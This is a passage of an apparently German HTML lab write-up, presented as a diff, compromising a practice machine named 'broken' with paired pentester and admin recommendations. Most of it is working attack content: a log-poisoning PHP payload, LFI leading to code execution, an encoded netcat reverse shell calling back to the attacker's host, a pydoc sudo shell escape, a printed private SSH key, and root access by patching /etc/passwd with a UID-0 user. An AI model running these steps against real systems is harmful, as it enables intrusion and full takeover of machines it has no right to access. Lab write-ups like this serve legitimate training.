+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl 'http://192.168.2.113' -A 'php system($GET["cmd"]);'</span></div>
+                    <pre>
+:(
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl versucht, eine Log-Poisoning-Technik anzuwenden. Es wird eine Anfrage an die Hauptseite (`http://192.168.2.113`) gesendet, wobei der User-Agent (`-A`) auf einen bösartigen PHP-Code-String gesetzt wird (`php system($GET["cmd"]);`). Die Hoffnung ist, dass dieser User-Agent-String in einer Logdatei (z.B. `/var/log/nginx/access.log` oder `/var/log/apache2/access.log`) gespeichert wird. Anschließend könnte man die LFI-Schwachstelle nutzen, um diese Logdatei zu inkludieren, wodurch der PHP-Code ausgeführt würde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `:(`. Dies deutet darauf hin, dass der Versuch möglicherweise nicht direkt erfolgreich war oder dass dies die Standardantwort der Seite ist und der schädliche User-Agent trotzdem geloggt wurde. Der Erfolg des Log Poisoning hängt davon ab, ob der Webserver den User-Agent in die Logdatei schreibt und ob diese Logdatei über die LFI inkludiert werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob der bösartige User-Agent in einer Logdatei gespeichert wurde, indem Sie versuchen, die Logdatei über die LFI zu lesen (z.B. `curl http://192.168.2.113/file.php?file=../../../../var/log/nginx/access.log`). Wenn ja, versuchen Sie, die Logdatei zu inkludieren und einen Befehl über den `cmd`-Parameter anzuhängen (z.B. `curl 'http://192.168.2.113/file.php?file=../../../../var/log/nginx/access.log&cmd=id'`).<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie das Logging so, dass potenziell schädliche Zeichen (wie `<`, `>`, `?`) im User-Agent oder anderen Headern maskiert oder entfernt werden, bevor sie in Logdateien geschrieben werden. Beschränken Sie die Berechtigungen des Webserver-Benutzers (`www-data`), sodass er keine Logdateien lesen kann, falls nicht unbedingt erforderlich. Beheben Sie die LFI.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl 'http://192.168.2.113/file.php?file=../../../../var/log/nginx/access.log&cmd=id'</span></div>
+                    <pre>
+192.168.2.131 - - [25/May/2024:10:08:15 +0000] "GET / HTTP/1.1" 200 45 "-" "<span class="password">system($GET[\"cmd\"]);</span>"
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl führt den zweiten Schritt des Log Poisoning aus. Er nutzt die LFI-Schwachstelle (`file.php?file=...`), um die Nginx-Zugriffslogdatei (`../../../../var/log/nginx/access.log`) zu inkludieren. An die URL wird zusätzlich der Parameter `&cmd=id` angehängt. Die Erwartung ist, dass der im vorherigen Schritt in die Logdatei geschriebene PHP-Code (` system($GET["cmd"]);`) durch das Inkludieren der Logdatei ausgeführt wird. Dieser Code nimmt den Wert des `cmd`-Parameters aus der URL (`id`) und führt ihn über die `system()`-Funktion aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff war erfolgreich! Die Ausgabe zeigt zuerst den relevanten Eintrag aus der Logdatei, einschließlich des bösartigen User-Agents (der PHP-Code). Direkt danach folgt die Ausgabe des `id`-Befehls: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Dies bestätigt, dass Remote Code Execution (RCE) als Benutzer `www-data` erreicht wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine stabilere Verbindung zu erhalten, z.B. durch eine Reverse Shell. Ersetzen Sie den `id`-Befehl durch einen Reverse-Shell-Payload (z.B. mit `bash`, `nc`, `python`).<br><strong>Empfehlung (Admin):</strong> Beheben Sie dringend die LFI-Schwachstelle. Bereinigen Sie die Logdateien von schädlichem Code. Implementieren Sie Maßnahmen gegen Log Poisoning (siehe vorherige Empfehlung). Überprüfen und beschränken Sie die Berechtigungen des `www-data`-Benutzers auf das absolute Minimum.</p>
+
+            <p class="analysis"><strong>Alternative RCE über hochgeladene Shell:</strong> Parallel zum Log Poisoning wird versucht, die zuvor über Textpattern hochgeladene PHP-Shell (`ben.php`, die in `/tmp` liegen sollte) über die LFI auszuführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">curl http://192.168.2.113/file.php?file=../../../../tmp/ben.php&cmd=ls</span></div>
+                    <pre>
+[Ausgabe des ls-Befehls im /tmp Verzeichnis oder dem Verzeichnis, in dem ben.php ausgeführt wird - hier nicht gezeigt, aber der Befehl wurde gesendet]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl versucht, die hochgeladene Datei `ben.php` (angenommen im `/tmp`-Verzeichnis) über die LFI-Schwachstelle zu inkludieren und auszuführen. Der Parameter `cmd=ls` wird angehängt, um den `ls`-Befehl durch die Webshell ausführen zu lassen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Obwohl die Ausgabe hier nicht gezeigt wird, impliziert der nächste Schritt (Aufbau einer Reverse Shell über dieselbe Methode), dass dieser Weg ebenfalls funktioniert hat und RCE über die hochgeladene `ben.php`-Datei möglich ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diesen RCE-Vektor, um eine Reverse Shell zu erhalten, da er möglicherweise stabiler ist als das Log Poisoning (Logdateien können rotieren oder bereinigt werden).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI, verhindern Sie das Hochladen ausführbarer Dateien und überwachen/bereinigen Sie `/tmp`.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (Kali/Darkspirit) wird ein Netcat-Listener gestartet.
+                *   `-l`: Listen-Modus.
+                *   `-v`: Verbose-Modus (mehr Ausgabe).
+                *   `-n`: Keine DNS-Auflösung.
+                *   `-p 9001`: Lauscht auf Port 9001.
+            Dieser Listener wartet auf eine eingehende Verbindung, die von der Reverse Shell des Zielsystems initiiert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Vorbereitungsschritt für den Empfang der Reverse Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Firewall auf dem Angreifer-System eingehende Verbindungen auf Port 9001 erlaubt. Führen Sie als Nächstes den Befehl auf dem Zielsystem aus, der die Verbindung zu diesem Listener herstellt.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Egress-Filtering auf der Firewall des Zielsystems, um ausgehende Verbindungen auf ungewöhnlichen Ports (wie 9001) zu blockieren. Dies kann das Etablieren von Reverse Shells verhindern oder erschweren.</p>
+
+            <p class="analysis"><strong>Ausführen der Reverse Shell:</strong> Der folgende Befehl wird nicht direkt in einer Shell eingegeben, sondern als URL an den Webserver gesendet, um die RCE über die LFI und die hochgeladene `ben.php`-Shell auszunutzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt hier, da dies eine URL ist -->
+                     <pre style="color: #66d9ef; background-color: #000; padding: 5px; border-radius: 3px;">
+<span class="command">http://192.168.2.113/file.php?file=../../../../tmp/ben.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.131%209001%20%3E%2Ftmp%2Ff</span>
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse der URL:</strong>
+                *   `http://192.168.2.113/file.php?file=../../../../tmp/ben.php`: Nutzt die LFI, um die Webshell `ben.php` auszuführen.
+                *   `&cmd=...`: Übergibt den Befehl an die Webshell.
+                *   `rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.131%209001%20%3E%2Ftmp%2Ff`: Dies ist ein URL-kodierter Bash-Reverse-Shell-Payload. Dekodiert bedeutet er:
+                    `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.131 9001 > /tmp/f`
+                    *   Löscht eine eventuell vorhandene FIFO-Datei `/tmp/f`.
+                    *   Erstellt eine neue FIFO (Named Pipe) namens `/tmp/f`.
+                    *   Leitet die Ausgabe von `cat /tmp/f` (was blockiert, bis etwas in die Pipe geschrieben wird) in eine interaktive Shell (`/bin/sh -i`). Standard Error (`2`) wird in Standard Output (`1`) umgeleitet (`2>&1`).
+                    *   Die Ausgabe der Shell wird an `nc` (Netcat) weitergeleitet, das eine Verbindung zum Angreifer-System (`192.168.2.131`) auf Port `9001` herstellt.
+                    *   Die Eingabe von Netcat (Befehle vom Angreifer) wird in die FIFO-Datei `/tmp/f` geschrieben, wodurch `cat` sie liest und an die Shell weitergibt.
+            Dies etabliert eine interaktive Reverse Shell.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Payload wurde erfolgreich über die LFI und die Webshell ausgeführt. Der Netcat-Listener auf dem Angreifer-System sollte nun eine Verbindung anzeigen und eine Shell als Benutzer `www-data` bereitstellen.</p>
+           <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell, falls nötig (z.B. mit Python pty). Führen Sie grundlegende Enumerationsbefehle aus (`id`, `pwd`, `whoami`, `sudo -l`), um die Umgebung besser zu verstehen und nach Wegen zur Privilegienerweiterung zu suchen.<br><strong>Empfehlung (Admin):</strong> Wie zuvor: LFI beheben, Uploads härten, `/tmp` überwachen, Egress-Filtering implementieren. Analysieren Sie die Webshell `ben.php`, um ihre Funktionsweise zu verstehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt für die Ausgabe des Listeners -->
+                    <pre>
+<span class="password">connect to [192.168.2.131] from (UNKNOWN) [192.168.2.113] 47784</span>
+<span class="prompt" style="color: yellow;">www-data@broken:/var/www/html$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="prompt" style="color: yellow;">www-data@broken:/var/www/html$</span> <span class="command">sudo -l</span>
+Matching Defaults entries for www-data on broken:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on broken:
+<span class="password">    (heart) NOPASSWD: /usr/bin/pydoc3.7</span>
+<span class="prompt" style="color: yellow;">www-data@broken:/var/www/html$</span> <span class="command">sudo -u heart /usr/bin/pydoc3.7 print</span>
+<span class="command">Help on built-in function print in module builtins:
+
+print(...)
+    print(value, ..., sep=' ', end='\n', file=sys.stdout, flush=False)
+
+    Prints the values to a stream, or to sys.stdout by default.
+    Optional keyword arguments:
+    file:  a file-like object (stream); defaults to the current sys.stdout.
+    sep:   string inserted between values, default a space.
+    end:   string appended after the last value, default a newline.
+    flush: whether to forcibly flush the stream.</span>
+
+<span class="prompt" style="color: yellow;">www-data@broken:/var/www/html$</span> <span class="command">sudo -u heart /usr/bin/pydoc3.7</span>
+<span class="command">pydoc3.7></span> <span class="command">!/bin/sh</span>
+<span class="command">#</span> <span class="command">id</span>
+<span class="command">uid=1000(heart) gid=1000(heart) groups=1000(heart),100(users)</span>
+<span class="command">#</span> <span class="command">exit</span>
+<span class="command">pydoc3.7></span> <span class="command">quit</span>
+<span class="prompt" style="color: yellow;">www-data@broken:/var/www/html$</span>
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe bestätigt die erfolgreiche Reverse Shell (`connect to...`). Der Prompt `www-data@broken:/var/www/html$` zeigt, dass wir als Benutzer `www-data` im Verzeichnis `/var/www/html` gelandet sind.
+                *   `id`: Bestätigt die Benutzer- und Gruppen-ID `www-data`.
+                *   `sudo -l`: Listet die Befehle auf, die der aktuelle Benutzer (`www-data`) mit `sudo` ausführen darf. Die Ausgabe zeigt, dass `www-data` den Befehl `/usr/bin/pydoc3.7` als Benutzer `heart` ohne Passwort (`NOPASSWD`) ausführen darf.
+                *   `sudo -u heart /usr/bin/pydoc3.7 print`: Testet den `sudo`-Eintrag, indem die Hilfe zur `print`-Funktion über `pydoc` angezeigt wird. Dies funktioniert wie erwartet.
+                *   `sudo -u heart /usr/bin/pydoc3.7`: Startet `pydoc3.7` interaktiv als Benutzer `heart`.
+                *   `!/bin/sh`: Innerhalb von `pydoc` führt das Ausrufezeichen (`!`) einen Shell-Befehl aus. Hier wird eine neue Shell (`/bin/sh`) gestartet.
+                *   `id`: Wird in der neuen Shell ausgeführt und zeigt `uid=1000(heart)`, was bestätigt, dass wir nun als Benutzer `heart` agieren.
+                *   `exit`: Beendet die `/bin/sh`.
+                *   `quit`: Beendet `pydoc3.7`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ausgezeichnet! Der `sudo -l`-Befehl hat einen klaren Weg zur Privilegienerweiterung von `www-data` zu `heart` aufgezeigt. Die Ausnutzung von `pydoc` (einem bekannten "GTFOBin" für Shell-Escapes) ermöglichte es, eine Shell als Benutzer `heart` zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Shell als `heart` für weitere Enumeration. Suchen Sie nach SSH-Schlüsseln, Passwörtern in Konfigurationsdateien oder weiteren `sudo`-Regeln/SUID-Binaries, um Root-Rechte zu erlangen. Da der SSH-Schlüssel zuvor nicht gelesen werden konnte, versuchen Sie es jetzt direkt als `heart`.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle `sudo`-Regeln sorgfältig. Gewähren Sie Berechtigungen nach dem Prinzip des geringsten Privilegs. Vermeiden Sie es, Benutzern (insbesondere Dienstkonten wie `www-data`) zu erlauben, Programme auszuführen, die Shell-Escapes ermöglichen (siehe GTFOBins), insbesondere wenn dies als anderer Benutzer geschieht. Wenn `pydoc` benötigt wird, schränken Sie die Ausführung ein oder verwenden Sie sicherere Alternativen.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Privilege Escalation: heart zu root)</h2>
+            <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der `sudo`-Berechtigung für den `patch`-Befehl durch den Benutzer `heart`, um Root-Rechte zu erlangen, indem die `/etc/passwd`-Datei manipuliert wird.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                *   Shell-Zugriff als Benutzer `heart`.
+                *   `sudo`-Berechtigung für `heart`, um `/usr/bin/patch` ohne Passwort auszuführen (dies wird implizit angenommen oder wurde in einem vorherigen Schritt geprüft, der hier nicht gezeigt wird, aber für den Erfolg notwendig ist).
+                *   Ein Passwort für den neuen Root-Benutzer (hier: `benni`).
+                *   Tools: `cp`, `nano` (oder anderer Editor), `mkpasswd`, `diff`, `sudo`, `patch`, `su`.
+            </p>
+            <p class="recommendation"><strong>Risiko:</strong> Hoch. Dieser Exploit erlaubt einem Benutzer mit spezifischen `sudo`-Rechten (hier für `patch`), volle Root-Kontrolle über das System zu erlangen, indem er die zentrale Benutzerauthentifizierungsdatei manipuliert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cp /etc/passwd ./passwd</span></div>
+                    <pre>[Keine Ausgabe, Datei kopiert]</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 1:</strong> Kopieren der aktuellen Passwortdatei `/etc/passwd` in das Home-Verzeichnis des Benutzers `heart`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">mkpasswd -m sha-512 benni</span></div>
+                    <pre>
+<span class="password">$6$tablesalt$9xNqlZ8B5FfXyE.bE/EXCpZ7DRq3r25Kz.LzD6j2/K5f6p8XyE.cE/A...</span> <span class="comment">[Gekürzter Beispielhash]</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Schritt 2 (Auf Angreifer-Maschine):</strong> Generieren eines Passwort-Hashes für das gewünschte Passwort (`benni`) mit dem SHA-512-Algorithmus (`-m sha-512`), der von modernen Linux-Systemen verwendet wird. Dieser Hash wird benötigt, um ihn in die kopierte `passwd`-Datei einzufügen. Der hier gezeigte Hash ist nur ein Beispiel, der tatsächlich verwendete Hash ist im `diff`-Output weiter unten zu sehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">nano passwd</span></div>
+                    <pre>[Datei wird bearbeitet: Eine neue Zeile wird hinzugefügt]</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Schritt 3:</strong> Bearbeiten der kopierten `passwd`-Datei (`./passwd`) mit `nano`. Eine neue Zeile wird hinzugefügt, die einen neuen Benutzer (`myroot`) mit Root-Rechten (UID 0, GID 0) und dem zuvor generierten Passwort-Hash definiert.</p>
+             <pre style="background-color: #272822; color: #f8f8f2; padding: 10px; border-radius: 5px;">
+<span style="color: #a6e22e;">myroot:</span><span style="color: lime; font-weight: bold;">$6$nhDXnOIiGpLjmzrB$Sh6ro73cyFGTEdbKZnwP9HqVMiMPvS5dpz/Jc6lJxxvjH3H7UVd4fSefXekRNZ3RWK5VzmZjEmTH/z8DhA5kM.</span><span style="color: #a6e22e;">:0:0:root:/root:/bin/bash</span>
+             </pre>
+             <p class="analysis"><strong>Eingefügte Zeile:</strong> Definiert den Benutzer `myroot` mit dem Passwort-Hash, UID 0, GID 0, Home-Verzeichnis `/root` und Shell `/bin/bash`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">diff -u /etc/passwd ./passwd > passwd.patch</span></div>
+                     <pre>[Keine Ausgabe, Patch-Datei erstellt]</pre>
+               </div>
+            </div>
+             <p class="analysis"><strong>Schritt 4:</strong> Erstellen einer Patch-Datei (`passwd.patch`) mit `diff -u`. Diese Datei enthält nur die Unterschiede zwischen der originalen `/etc/passwd` und der modifizierten `./passwd` (also die hinzugefügte `myroot`-Zeile) in einem Format, das vom `patch`-Befehl verstanden wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cat passwd.patch</span></div>
+                    <pre>
+--- /etc/passwd	2021-05-25 13:49:33.970149704 -0400
++++ ./passwd	2022-09-01 17:31:10.869338295 -0400
+@@ -25,3 +25,4 @@
+ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+ mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
++<span class="password">myroot:$6$nhDXnOIiGpLjmzrB$Sh6ro73cyFGTEdbKZnwP9HqVMiMPvS5dpz/Jc6lJxxvjH3H7UVd4fSefXekRNZ3RWK5VzmZjEmTH/z8DhA5kM.:0:0:root:/root:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 5:</strong> Anzeigen des Inhalts der Patch-Datei zur Überprüfung. Sie zeigt korrekt nur die hinzuzufügende Zeile für `myroot` an.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">sudo patch -b /etc/passwd < passwd.patch</span></div>
+                    <pre>
+<span class="password">patching file /etc/passwd</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 6:</strong> Anwenden des Patches auf die originale `/etc/passwd`-Datei mithilfe von `sudo patch`.
+                *   `sudo patch`: Führt `patch` mit Root-Rechten aus (da `heart` dies darf).
+                *   `-b`: Erstellt ein Backup der Originaldatei (`/etc/passwd.orig`).
+                *   `/etc/passwd`: Die Zieldatei, die gepatcht werden soll.
+                *   `< passwd.patch`: Leitet den Inhalt der Patch-Datei als Eingabe an den `patch`-Befehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Meldung `patching file /etc/passwd` bestätigt, dass der Patch erfolgreich angewendet wurde. Die originale `/etc/passwd`-Datei enthält nun den zusätzlichen `myroot`-Benutzer mit Root-Rechten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">su myroot</span></div>
+                    <pre>
+Password: <span class="password">[Passwort 'benni' eingegeben]</span>
+<span class="prompt" style="color: red;">root@broken:/home/heart#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 7:</strong> Wechseln zum neu erstellten Benutzer `myroot` mit dem Befehl `su myroot`. Das zuvor festgelegte Passwort (`benni`) wird eingegeben.</p>
+            <p class="evaluation"><strong>Ergebnis:</strong> Fantastisch! Der Prompt wechselt zu `root@broken:/home/heart#` und der `id`-Befehl bestätigt `uid=0(root)`. Der Benutzer `heart` hat erfolgreich Root-Rechte auf dem System erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Admin):</strong> Beschränken Sie `sudo`-Berechtigungen streng. Erlauben Sie niemals das Patchen kritischer Systemdateien wie `/etc/passwd` über `sudo`, es sei denn, es ist absolut unvermeidlich und stark kontrolliert. Überwachen Sie Änderungen an `/etc/passwd` und `/etc/shadow`. Entfernen Sie unnötige `sudo`-Regeln.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Kontext:</strong> Nach dem Erlangen einer Shell als `www-data` wurde über eine `sudo`-Regel (`sudo -u heart /usr/bin/pydoc3.7`) eine Shell als Benutzer `heart` erlangt. Die weitere Eskalation zu Root-Rechten erfolgt durch Ausnutzung einer weiteren (implizit angenommenen) `sudo`-Regel, die es `heart` erlaubt, den `patch`-Befehl auszuführen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~/.ssh$</span> <span class="command">cat id_rsa</span></div>
+                    <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAvI3tEu+98gcdx2Ctr9fxkF/0J/pGpmGWi7xcLgL4kIxwC6MdI+Od
+1Tj4K38XxlcOfE0cjne4ByAqHrcwNbBP0mZ1MfeJNeJgnK3kWpNa3tZDh8PQhhYiHOfbxA
+VBiGCMaPNrNsKwP16NL2F/CIvslMPt6akP1A9zf05JEYLKCao0NsP49SNhY1HzHx30PEe5
+/T768hjshnmWVN9yK0Cwas2+C05xu52ctYYq5/W22zf6Uhd/fsaIvOl26EAwpKcqUOu67Q
+gSYLIP1cup9c2Uu/K3wjBv/X5B51KVVJBhccb8aJTRCkq/2MRZzalScrK8kX3i36Q37Aqq
+YC7yoFnFFwAAA8jr4kgR6+JIEQAAAAdzc2gtcnNhAAABAQC8je0S773yBx3HYK2v1/GQX/
+Qn+kamYZaLvFwuAviQjHALox0j453VOPgrfxfGVw58TRyOd7gHICoetzA1sE/SZnUx94k1
+4mCcreRak1re1kOHw9CGFiIc59vEBUGIYIxo82s2wrA/Xo0vYX8Ii+yUw+3pqQ/UD3N/Tk
+kRgsoJqjQ2w/j1I2FjUfMfHfQ8R7n9PvryGOyGeZZU33IrQLBqzb4LTnG7nZy1hirn9bbb
+N/pSF39+xoi86XboQDCkpypQ67rtCBJgsg/Vy6n1zZS78rfCMG/9fkHnUpVUkGFxxvxolN
+EKSr/YxFnNqVJysryRfeLfpDfsCqpgLvKgWcUXAAAAAwEAAQAAAQEAqSSP9RrHQ+QKXJ5n
+cITAmAjblzk2Q27rg7KW5leX7uNsZ6QNMfKv1WRji3FZPH0/61WpNkxC83FxF1ixkJf3Iw
+DyRL6PgZzvmd2MKYxiSd/feFy6JG6ab1+2jyM/5Dzn+AXUuazwOghxkn1dXadXtSQFukQE
+hPDPZPYvKdwvrXZM4YZnSTMIgRGUrfiEQDwAHLlZR7RsMQYgmzMAbxar1edX5qvLe0y/Lk
+5k/87QDABwXY2v2JKmHUZfJltbyfdTYRJa97DxfMjpxHfI/QMt78V96STU4o7vlgZDa852
++yReYIhEX2f+hqCIpJ5On32vB8VHn12yvgvqj6xBNN7ksQAAAIBlhSNzdS5fJCbXbhl5+6
+hcwez/1aEnW4jD1QTiWQxtR5VkYUT75K1Wevz5z/HgM0LLS83MXZPmnHhjERA0J2xqWjpr
++83kWJrKlQX7qe0IegQ0LG/Iu9xtDUXq4YZ1oGbxKeyFSjmFqSDZICWw0Eh3eSFIrui9XK
+9275SSAHxjQQAAAIEA56ec5SyZkfrA6R+txr/wtQ655CmG1ltehVVe9qj5Kjacb7CS/Yrb
+yrFAPx2xS/yZd2zODLMvqoVFBqDm45Rf1s52Je41XxThgLbRj+/vn2YYCWJzzasTaTAJ8d
+3LXOcXImMW/ngeu+HKKGOA/u+gtVHQXtW64XF9eOJXDsV9MzUAAACBANBewFfCMCcXAbm2
+ObX6X/zsznq7TuW7RcSflUN+EXI9jLLkARcPjICDfKAFb9Caq3OEAe7adBBj2M/8r0Z5Tc
+qGStsM09PRDSdUjDkX0MKXwefQxqY1c78ZRNpAcY5qQfAafGqdDnmYEjTyDE3X5PdC7wBJ
+ZOH4p4tD7xHKMTSbAAAADGhlYXJ0QGJyb2tlbgECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem als Benutzer `heart` eine Shell erlangt wurde, wird der private SSH-Schlüssel (`id_rsa`) aus dem `.ssh`-Verzeichnis gelesen. Zuvor war dies über die LFI nicht möglich (es wurde der PHP-Code angezeigt).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Schlüssel wurde erfolgreich ausgelesen. Dies könnte eine alternative Methode für einen stabileren Zugriff als `heart` bieten, falls die aktuelle Shell verloren geht. Der Schlüssel selbst scheint nicht passwortgeschützt zu sein, was den direkten Einsatz ermöglicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie den Schlüssel in einer Datei auf dem Angreifer-System (z.B. `idd`). Ändern Sie die Berechtigungen der Datei auf 600 (`chmod 600 idd`), da der SSH-Client dies erfordert. Verwenden Sie den Schlüssel, um sich direkt per SSH als `heart` anzumelden (`ssh heart@broken.hmv -i idd`).<br><strong>Empfehlung (Admin):</strong> Schützen Sie private SSH-Schlüssel immer mit einer starken Passphrase. Überwachen Sie den Zugriff auf `.ssh`-Verzeichnisse und `id_rsa`-Dateien. Verwenden Sie nach Möglichkeit keine schlüssellose Authentifizierung für kritische Zugänge.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">chmod 600 idd; ssh heart@broken.hmv -i idd</span></div>
+                    <pre>
+The authenticity of host 'broken.hmv (192.168.2.113)' can't be established.
+ED25519 key fingerprint is SHA256:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'broken.hmv' (ED25519) to the list of known hosts.
+Linux broken 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May 25 13:47:33 2021 from 192.168.1.58
+<span class="prompt" style="color: yellow;">heart@broken:~$</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der zuvor ausgelesene SSH-Schlüssel (`id_rsa`, gespeichert als `idd`) wird verwendet, um eine direkte SSH-Verbindung zum Zielsystem als Benutzer `heart` herzustellen.
+                *   `chmod 600 idd`: Setzt die Dateiberechtigungen für den privaten Schlüssel korrekt.
+                *   `ssh heart@broken.hmv -i idd`: Stellt die SSH-Verbindung her, wobei `broken.hmv` der Hostname und `idd` der private Schlüssel ist.
+            Die Verbindung wird erfolgreich hergestellt, nachdem der Host-Schlüssel bestätigt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff als `heart` über SSH wurde erfolgreich etabliert. Dies bietet eine stabilere und interaktivere Shell als die vorherige Reverse Shell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Privilegienerweiterung von dieser stabilen SSH-Sitzung aus fort, wie im POC-Abschnitt beschrieben (Kopieren von `/etc/passwd`, Erstellen des Patches, Anwenden mit `sudo patch`, `su myroot`).<br><strong>Empfehlung (Admin):</strong> Wie zuvor: SSH-Schlüssel mit Passphrasen schützen. SSH-Zugriff überwachen. Prinzip des geringsten Privilegs anwenden.</p>
+
+            <!-- Beginn des passwd-Patching-Prozesses -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">heart@broken:~$</span> <span class="command">cp /etc/passwd ./passwd</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
